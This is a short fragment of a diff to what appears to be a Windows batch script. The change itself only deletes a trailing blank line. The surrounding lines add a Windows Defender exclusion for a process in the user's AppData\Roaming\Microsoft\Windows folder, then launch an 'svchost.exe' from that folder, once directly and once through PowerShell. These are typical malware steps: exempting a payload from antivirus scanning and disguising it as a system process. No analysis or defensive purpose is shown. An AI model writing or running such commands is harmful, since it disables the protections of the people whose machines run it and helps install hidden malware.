@@ -117,4 +117,3 @@ Add-MpPreference -ExclusionProcess "%USERPROFILE%\AppData\Roaming\Microsoft\Wind
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows
 svchost.exe
 powershell -command " start svchost.exe"
-
